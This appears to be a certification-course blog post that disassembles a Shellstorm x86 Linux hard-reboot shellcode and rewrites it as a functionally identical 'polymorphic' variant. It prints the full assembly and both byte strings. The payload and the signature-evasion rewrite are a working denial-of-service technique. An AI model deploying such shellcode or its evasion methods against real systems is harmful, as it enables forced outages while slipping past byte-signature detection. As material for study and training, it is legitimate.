# Polymorphic conversion of three payloads - part 3

## Hard reboot

The shellcode chosen for this assignment comes from Shellstorm (Hard reboot without any message and data not lost shellcode) and is located at 
<http://shell-storm.org/shellcode/files/shellcode-639.php>.

This shellcode claims to perform an hard reboot and is 33 bytes long. Let's take the shellcode and decompile it.

```
> echo -ne "\xb0\x24\xcd\x80\x31\xc0\xb0\x58\xbb\xad\xde\xe1\xfe\xb9\x69\x19\x12\x28\xba\x67\x45\x23\x01\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80" | ndisasm -b32 -

00000000  B024              mov al,0x24
00000002  CD80              int 0x80
00000004  31C0              xor eax,eax
00000006  B058              mov al,0x58
00000008  BBADDEE1FE        mov ebx,0xfee1dead
0000000D  B969191228        mov ecx,0x28121969
00000012  BA67452301        mov edx,0x1234567
00000017  CD80              int 0x80
00000019  31C0              xor eax,eax
0000001B  B001              mov al,0x1
0000001D  31DB              xor ebx,ebx
0000001F  CD80              int 0x80
```

In a nutshell the following syscalls are used to perform an hard reboot:

```
> man 2 sync
commit filesystem caches to disk
void sync(void);

> man 2 reboot
reboot or enable/disable Ctrl-Alt-Del
int reboot(int magic, int magic2, int cmd, void *arg);

> man 2 exit
terminate the calling process
void _exit(int status);
```

Let's try to modify the syntax of the code without affecting the semantic.

```
; compile with:
; 	nasm -f elf32 shellcode-639-poly.asm
;	ld -o shellcode-639-poly shellcode-639-poly.o
; extract shellcode with:
; 	objdump -d shellcode-639-poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start
section .text
    _start:
        mov al,0x23         ; mov in al register the sycall number-1 for sync
        inc al              ; increment the al register to match the syscall number for sync 
        int 0x80            ; interrupt to execute sync syscall
        xor eax, eax        ; zeroing eax to ensure that even in case of failure of sync the reboot syscall number is correctly stored
        mov al, 0x58        ; mov in al the syscall number for the reboot syscall
        mov ebx, 0x7f70ef56 ; 0xfee1dead / 2
        add ebx, ebx        ; recalculate 0xfee1dead
        add ebx, 1          ; recalculate 0xfee1dead
        mov ecx, 0x5121996  ; LINUX_REBOOT_MAGIC2A
        mov edx, 0x2468ace  ; 0x1234567 << 1
        ror edx, 1          ; shift right to get back 0x1234567
        int 0x80            ; interrupt to execute reboot syscall - no need to execute also the exit syscall
```

The resulting shellcode does not contains null bytes and is very different from the initial one, however semantically the two shellcodes are identical. This new shellcode is *34bytes* long.

```
\xb0\x23\xfe\xc0\xcd\x80\x31\xc0\xb0\x58\xbb\x56\xef\x70\x7f\x01\xdb\x83\xc3\x01\xb9\x96\x19\x12\x05\xba\xce\x8a\x46\x02\xd1\xca\xcd\x80
```

<br/>

---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.*

<http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert>

*Student-ID: PA-8733*
